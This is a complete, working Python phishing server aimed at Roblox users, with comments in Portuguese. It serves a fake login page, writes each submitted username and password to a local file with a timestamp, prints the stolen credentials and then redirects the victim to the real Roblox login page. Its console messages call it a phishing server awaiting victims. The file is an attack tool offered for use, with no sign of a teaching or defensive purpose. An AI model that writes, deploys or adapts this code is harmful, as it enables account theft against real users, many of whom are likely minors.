import http.server
import socketserver
import urllib.parse
import datetime

PORT = 3000
CAPTURE_FILE = "captured_credentials.txt"

class RobloxPhishHandler(http.server.SimpleHTTPRequestHandler):
    def _redirect(self, path):
        self.send_response(302)
        self.send_header("Location", path)
        self.end_headers()

    def do_POST(self):
        # Verifica se é o formulário de login
        if self.path == '/':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = urllib.parse.parse_qs(post_data)
            
            # Extrai os campos
            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]
            
            # Salva em arquivo com timestamp
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(CAPTURE_FILE, 'a') as f:
                f.write(f"[{timestamp}] USER: {username} | PASS: {password}\n")
            
            print(f"\n[+] CREDENCIALS CAPTURED: {username} / {password}")
            
            # Redireciona para o site real do Roblox
            self._redirect("https://www.roblox.com/login")
        else:
            self.send_error(404, "Not Found")

    def do_GET(self):
        # Se for a raiz, serve o index.html
        if self.path == '/':
            self.path = '/index.html'
        return super().do_GET()

if __name__ == "__main__":
    with socketserver.TCPServer(("", PORT), RobloxPhishHandler) as httpd:
        print(f"[*] Servidor de Phishing iniciado em http://0.0.0.0:{PORT}")
        print(f"[*] Aguardando vítimas...")
        httpd.serve_forever()
